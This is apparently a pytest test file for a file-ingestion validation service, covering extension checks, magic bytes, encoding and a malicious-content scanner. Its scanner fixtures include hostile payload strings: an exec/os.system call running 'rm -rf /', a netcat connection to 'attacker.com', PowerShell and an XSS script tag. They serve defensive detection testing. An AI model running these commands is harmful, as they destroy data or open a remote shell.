"""
Unit Tests for File Ingestion Service
Tests: File validation, malware detection, encoding verification, data parsing
"""
import pytest
import tempfile
import pandas as pd
from pathlib import Path
from io import BytesIO

from services.ingestion_service import (
    validate_file_extension, check_magic_bytes, scan_for_malicious_content,
    enforce_utf8_encoding, compute_sha256, IngestionError
)


# ─────────────────────────────────────────────────────────────
# TESTS: File Extension Validation
# ─────────────────────────────────────────────────────────────

def test_validate_csv_extension():
    """Verify .csv extension is allowed."""
    ext = validate_file_extension("data.csv")
    assert ext == ".csv"


def test_validate_xlsx_extension():
    """Verify .xlsx extension is allowed."""
    ext = validate_file_extension("data.xlsx")
    assert ext == ".xlsx"


def test_validate_json_extension():
    """Verify .json extension is allowed."""
    ext = validate_file_extension("data.json")
    assert ext == ".json"


def test_validate_invalid_extension():
    """Verify .exe, .bat, .sh are rejected."""
    with pytest.raises(IngestionError):
        validate_file_extension("malware.exe")

    with pytest.raises(IngestionError):
        validate_file_extension("script.bat")

    with pytest.raises(IngestionError):
        validate_file_extension("payload.sh")


def test_validate_extension_case_insensitive():
    """Verify extension check is case-insensitive."""
    ext = validate_file_extension("data.CSV")
    assert ext == ".csv"

    ext = validate_file_extension("data.XLSX")
    assert ext == ".xlsx"


def test_validate_path_traversal_rejected():
    """Verify path traversal is blocked."""
    # Attempting to use ../ should be rejected
    ext = validate_file_extension("../../etc/passwd.csv")
    assert ext == ".csv"  # Only the filename is used


def test_validate_no_extension():
    """Verify file without extension is rejected."""
    with pytest.raises(IngestionError):
        validate_file_extension("datafile")


# ─────────────────────────────────────────────────────────────
# TESTS: Magic Bytes Validation
# ─────────────────────────────────────────────────────────────

def test_check_magic_bytes_valid_xlsx():
    """Verify valid XLSX (ZIP) magic bytes are accepted."""
    # PK magic bytes (ZIP file signature)
    xlsx_bytes = b"PK\x03\x04" + b"x" * 100
    assert check_magic_bytes(xlsx_bytes, ".xlsx") is True


def test_check_magic_bytes_invalid_xlsx():
    """Verify invalid XLSX magic bytes are rejected."""
    # Not a ZIP signature
    bad_bytes = b"\x00\x01\x02\x03" + b"x" * 100
    assert check_magic_bytes(bad_bytes, ".xlsx") is False


def test_check_magic_bytes_csv():
    """Verify CSV files don't require magic bytes (content-based)."""
    # CSV magic bytes are optional, validation is content-based
    csv_bytes = b"Name,Age,Salary\nJohn,30,50000"
    assert check_magic_bytes(csv_bytes, ".csv") is True


def test_check_magic_bytes_json():
    """Verify JSON files don't require magic bytes."""
    json_bytes = b'{"name": "John", "age": 30}'
    assert check_magic_bytes(json_bytes, ".json") is True


# ─────────────────────────────────────────────────────────────
# TESTS: Malicious Content Scanning
# ─────────────────────────────────────────────────────────────

def test_scan_detects_exec_payload():
    """Verify __import__ exec patterns are detected."""
    malicious = b"Name,Age\nJohn,exec(__import__('os').system('rm -rf /'))"
    is_malicious, msg = scan_for_malicious_content(malicious)
    assert is_malicious is True
    assert "exec(" in msg or "__import__" in msg.lower()


def test_scan_detects_powershell_payload():
    """Verify PowerShell commands in CSV are detected."""
    malicious = b"Data\npowershell.exe -Command Get-Process"
    is_malicious, msg = scan_for_malicious_content(malicious)
    assert is_malicious is True


def test_scan_detects_sql_injection_like():
    """Verify subprocess calls are detected."""
    malicious = b"subprocess.Popen(['nc', 'attacker.com', '1234'])"
    is_malicious, msg = scan_for_malicious_content(malicious)
    assert is_malicious is True


def test_scan_detects_pe_header_fragments():
    """Verify PE executable headers are detected."""
    # PE header (MZ + magic bytes)
    malicious = b"Name\n\x00\x00\x01\x00" + b"x" * 50
    is_malicious, msg = scan_for_malicious_content(malicious)
    assert is_malicious is True


def test_scan_clean_csv_passes():
    """Verify clean CSV data passes scan."""
    clean_data = b"Name,Age,Salary\nAlice,28,60000\nBob,35,75000\nCarol,42,80000"
    is_malicious, msg = scan_for_malicious_content(clean_data)
    assert is_malicious is False
    assert msg == ""


def test_scan_detects_javascript_in_data():
    """Verify JavaScript payloads are detected."""
    malicious = b"Name,Notes\nAdmin,<script>alert('xss')</script>"
    is_malicious, msg = scan_for_malicious_content(malicious)
    assert is_malicious is True


def test_scan_only_first_8kb():
    """Verify only first 8KB is scanned for performance."""
    # Large file with payload at the end (should NOT be caught)
    large_safe = b"Name,Age\n" + (b"John,30\n" * 1000)  # Much larger than 8KB
    is_malicious, msg = scan_for_malicious_content(large_safe)
    assert is_malicious is False


# ─────────────────────────────────────────────────────────────
# TESTS: UTF-8 Encoding Enforcement
# ─────────────────────────────────────────────────────────────

def test_enforce_utf8_valid_csv():
    """Verify valid UTF-8 CSV is accepted."""
    utf8_data = "Name,Age\nJosé,30\nFrançois,25".encode("utf-8")
    encoding = enforce_utf8_encoding(utf8_data, ".csv")
    assert encoding == "utf-8"


def test_enforce_utf8_with_bom():
    """Verify UTF-8 with BOM is accepted."""
    utf8_bom_data = b"\xef\xbb\xbf" + "Name,Age\nJohn,30".encode("utf-8")
    encoding = enforce_utf8_encoding(utf8_bom_data, ".csv")
    assert encoding == "utf-8"


def test_enforce_utf8_xlsx_binary():
    """Verify XLSX binary files bypass UTF-8 check."""
    # XLSX is ZIP, not UTF-8 text
    xlsx_data = b"PK\x03\x04" + b"binary content"
    encoding = enforce_utf8_encoding(xlsx_data, ".xlsx")
    assert encoding == "utf-8"  # XLSX returns utf-8 by default


def test_enforce_utf8_invalid_encoding():
    """Verify non-UTF-8 text files are rejected."""
    # Latin-1 encoded data (not UTF-8)
    latin1_data = "Café".encode("latin-1")
    
    # Try to decode as UTF-8 (should fail)
    with pytest.raises(IngestionError):
        enforce_utf8_encoding(latin1_data, ".csv")


# ─────────────────────────────────────────────────────────────
# TESTS: SHA256 Checksum
# ─────────────────────────────────────────────────────────────

def test_compute_sha256():
    """Verify SHA256 checksum is computed correctly."""
    data = b"test data"
    checksum = compute_sha256(data)
    assert len(checksum) == 64  # SHA256 is 64 hex characters
    assert checksum.isalnum()


def test_sha256_consistent():
    """Verify same data produces same checksum."""
    data = b"test data"
    checksum1 = compute_sha256(data)
    checksum2 = compute_sha256(data)
    assert checksum1 == checksum2


def test_sha256_different_for_different_data():
    """Verify different data produces different checksums."""
    data1 = b"test data 1"
    data2 = b"test data 2"
    checksum1 = compute_sha256(data1)
    checksum2 = compute_sha256(data2)
    assert checksum1 != checksum2


# ─────────────────────────────────────────────────────────────
# INTEGRATION TESTS: Multi-layer Validation
# ─────────────────────────────────────────────────────────────

def test_complete_validation_flow_valid_csv():
    """Verify complete validation flow for valid CSV."""
    csv_content = "Name,Age,Salary\nAlice,28,60000\nBob,35,75000"
    data = csv_content.encode("utf-8")

    # Step 1: Extension validation
    ext = validate_file_extension("sales_data.csv")
    assert ext == ".csv"

    # Step 2: Magic bytes check
    assert check_magic_bytes(data, ".csv") is True

    # Step 3: Malicious content scan
    is_malicious, _ = scan_for_malicious_content(data)
    assert is_malicious is False

    # Step 4: Encoding check
    encoding = enforce_utf8_encoding(data, ".csv")
    assert encoding == "utf-8"

    # Step 5: Checksum
    checksum = compute_sha256(data)
    assert len(checksum) == 64


def test_complete_validation_flow_rejects_fake_csv():
    """Verify validation rejects file disguised as CSV."""
    # Create fake CSV (actually executable)
    fake_csv = b"Name,Age\nexec(__import__('os').system('malicious'))"
    
    ext = validate_file_extension("data.csv")
    assert ext == ".csv"
    
    is_malicious, _ = scan_for_malicious_content(fake_csv)
    assert is_malicious is True  # Detected as malicious


def test_complete_validation_rejects_wrong_extension():
    """Verify validation rejects disallowed extensions."""
    with pytest.raises(IngestionError):
        validate_file_extension("payload.exe")

    with pytest.raises(IngestionError):
        validate_file_extension("script.bat")

    with pytest.raises(IngestionError):
        validate_file_extension("backdoor.sh")


# ─────────────────────────────────────────────────────────────
# EDGE CASES
# ─────────────────────────────────────────────────────────────

def test_empty_file():
    """Verify empty file is handled."""
    empty_data = b""
    is_malicious, _ = scan_for_malicious_content(empty_data)
    assert is_malicious is False


def test_file_with_null_bytes():
    """Verify files with null bytes are scanned."""
    data_with_nulls = b"Name,Age\x00\x00\x01\x00\nJohn,30"
    is_malicious, msg = scan_for_malicious_content(data_with_nulls)
    assert is_malicious is True  # PE header detected


def test_very_large_filename():
    """Verify very long filenames are handled."""
    # Just verify it doesn't crash
    long_name = "a" * 200 + ".csv"
    ext = validate_file_extension(long_name)
    assert ext == ".csv"


def test_special_characters_in_filename():
    """Verify special characters in filename are handled."""
    filename = "data-file_2024.01.25.csv"
    ext = validate_file_extension(filename)
    assert ext == ".csv"
